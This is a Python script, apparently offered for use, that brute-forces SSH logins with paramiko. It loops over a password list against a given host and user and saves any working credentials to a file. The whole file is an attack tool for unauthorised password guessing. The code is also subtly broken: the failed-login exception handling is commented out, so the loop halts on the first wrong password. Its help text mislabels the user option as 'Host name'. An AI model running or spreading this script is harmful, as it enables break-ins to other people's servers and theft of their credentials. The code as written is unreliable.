import socket
import time
import argparse
import os
import paramiko

def is_ssh_open(hostname, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Set out errors and display the correct messages
    try:
        client.connect(hostname=hostname, username=user, password=password, timeout=3)
    except socket.timeout:
        print(f"[!] Host {hostname} unreachable.")
        return False
    #except AuthenticationException:
        #print(f"[!] Credentials are invalid {user} : {password}")
       #return False
    #except SSHException:
        #print(f"{BLUE}[*] Quota exceeded, retrying with delay... {RESET}")
        
        #time.sleep(60)
        #return is_ssh_open(hostname, user, password)
    else:
        print(f"[+] Found credentials:\n\tHostname: {hostname}\n\tUsername: {user}\n\tPassword: {password}")
        return True

if __name__ == "__main__":
    # Set the arguements
    parse = argparse.ArgumentParser(description="SSH Bruteforce Python Script.")
    parse.add_argument("host", help="Host name or IP address to brute force SSH")
    parse.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parse.add_argument("-u", "--user", help="Host name")

    args = parse.parse_args()
    host = args.host
    passList = args.passlist
    user = args.user

    # Read the pass list file
    passList = open(passList).read().splitlines()

    # Brute Force
    for password in passList:
        if (is_ssh_open(host, user, password)):
            # If valid save to file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")